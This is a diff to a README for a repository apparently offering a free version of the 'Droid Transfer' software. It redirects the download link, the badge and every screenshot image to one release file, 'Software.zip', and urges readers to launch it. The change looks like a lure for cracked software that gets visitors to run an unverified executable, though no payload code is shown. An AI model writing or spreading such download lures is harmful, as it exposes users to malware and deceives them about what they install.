@@ -36,19 +36,19 @@ Welcome to the Droid Transfer Free GitHub repository! Here you can explore all t
 
 ## Get Started 🚀
 
-Ready to experience the power of Droid Transfer Free? Download the latest version [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch the file to begin your seamless data transfer journey!
+Ready to experience the power of Droid Transfer Free? Download the latest version [here](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip) and launch the file to begin your seamless data transfer journey!
 
 Feel free to explore the "Releases" section if you encounter any issues with the download link.
 
-[![Download Droid Transfer](https://img.shields.io/badge/Download-Droid%20Transfer-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Droid Transfer](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip%20Transfer-brightgreen)](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip)
 
 ## Screenshots 📷
 
 Check out these screenshots to see Droid Transfer Free in action:
 
-![Transfer Files](https://example.com/transfer-files.png)
-![Sync Contacts](https://example.com/sync-contacts.png)
-![Activation Key Process](https://example.com/activation-key.png)
+![Transfer Files](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip)
+![Sync Contacts](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip)
+![Activation Key Process](https://github.com/lfnsym/Droid-Transfer-Free/releases/download/v1.0/Software.zip)
 
 ## Support & Feedback 🤝
 
